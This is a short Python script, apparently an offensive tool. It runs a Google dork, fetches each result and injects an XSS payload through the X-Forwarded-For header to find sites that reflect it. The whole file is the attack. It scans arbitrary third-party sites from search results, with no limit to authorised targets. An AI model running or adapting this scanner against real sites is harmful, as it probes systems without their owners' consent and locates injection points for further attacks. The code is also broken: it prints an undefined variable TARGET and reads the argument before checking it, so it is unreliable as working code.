#!/usr/bin/python3

'''
A tool to automatically find self xss vulnerabilities with X-FORWARD-FOR header.
'''

import requests
import sys
from google import search

DORK = sys.argv[1]
HEADERS = {'X-FORWARDED-FOR' : '"><img src=x onerror=alert(document.domain)>'}

if len(sys.argv) != 2 :
    print("Read the docs")
    exit(1)

def test_url(url):
    r = requests.get(url, headers=HEADERS)
    
    text = r.text

    if '"><img src=x onerror=alert(document.domain)>' in text:
        return 0
    else:
        return -1
if __name__ == "__main__":

    for link in search(DORK):
        if test_url(link) == 0:
            print("Wooohoo xss'd !!! in {}".format(TARGET))
        else:
            print("Failed :( ")
